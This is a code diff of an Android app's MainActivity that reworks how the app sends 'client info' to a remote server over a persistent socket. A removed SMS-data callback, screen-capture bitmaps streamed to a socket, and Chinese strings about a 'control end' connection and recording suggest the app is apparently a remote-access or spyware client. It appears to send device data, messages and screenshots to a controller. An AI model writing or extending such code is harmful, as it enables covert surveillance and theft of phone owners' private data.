@@ -70,34 +70,23 @@ public class MainActivity extends AppCompatActivity {
 
     private int failTimes;
 
+    OutputStream socketOutput;
+    Socket socketclient;
 
     public void sendClientInfo(final String info) {
         new Thread() {
             @Override
             public void run() {
-                Socket socket;
-                try {
-                    socket = new Socket(SERVER_ADDRESS, SERVER_PORT);
-                } catch (final Exception e) {
-                    e.printStackTrace();
-                    runOnUiThread(new Runnable() {
-                        @Override
-                        public void run() {
-                            Toast.makeText(MainActivity.this, "链接失败：" + e, Toast.LENGTH_SHORT).show();
-                        }
-                    });
-                    return;
 
-                }
                 try {
-                    OutputStream socketOutput = socket.getOutputStream();
-                    socketOutput.write(AllUtils.getUUIDCache().getBytes(CHAR_SET));
-                    LogUtils.i("======" + info);
-                    socketOutput.flush();
-                    socketOutput.write("str".getBytes());
+                    if (socketclient == null) {
+                        socketclient = new Socket(SERVER_ADDRESS, SERVER_PORT);
+                    }
+                    socketOutput = socketclient.getOutputStream();
+                    socketOutput.write(AllUtils.generateFixLength(info).getBytes());
+                    LogUtils.json(info);
                     socketOutput.write(info.getBytes(CHAR_SET));
                     socketOutput.flush();
-                    socketOutput.close();
 
                 } catch (IOException e) {
                     if (!(e instanceof EOFException)) {
@@ -110,19 +99,7 @@ public class MainActivity extends AppCompatActivity {
                             ToastUtils.showLong("控制端链接失败");
                         }
                     });
-//                    try {
-//                        sleep(2000);
-//                    } catch (InterruptedException e1) {
-//                        e1.printStackTrace();
-//                    }
-//                    if (failTimes < 5) {
-////                        sendClientInfo();
-//                    }
-//                    failTimes++;
 
-                } finally {
-                    closedSocket(socket);
-                    LogUtils.i("finally===closedSocket");
                 }
             }
         }.start();
@@ -148,8 +125,8 @@ public class MainActivity extends AppCompatActivity {
         }
 
         failTimes = 0;
-        String info = AllUtils.getClientInfo(MainActivity.this, false, listenerDataComplete);
-
+        String info = AllUtils.getClientInfo(MainActivity.this, true, null);
+        ToastUtils.showLong("读取完成");
         sendClientInfo(info);
 
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
@@ -165,13 +142,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
 
-    private AllUtils.OnSmsAppComeplete listenerDataComplete = new AllUtils.OnSmsAppComeplete() {
 
-        @Override
-        public void onComplete(String jsonData) {
-            sendClientInfo(jsonData);
-        }
-    };
 
     /**
      * 是否正在录像
@@ -211,7 +182,7 @@ public class MainActivity extends AppCompatActivity {
 //                        saveBitmap(bitmap);
                     sendBitmaSocket(bmp);
                     image.close();
-                    isScreening=true;
+                    isScreening = true;
 
 
                 }
@@ -286,7 +257,7 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onDestroy() {
         super.onDestroy();
-        isScreening=false;
+        isScreening = false;
 
     }
 
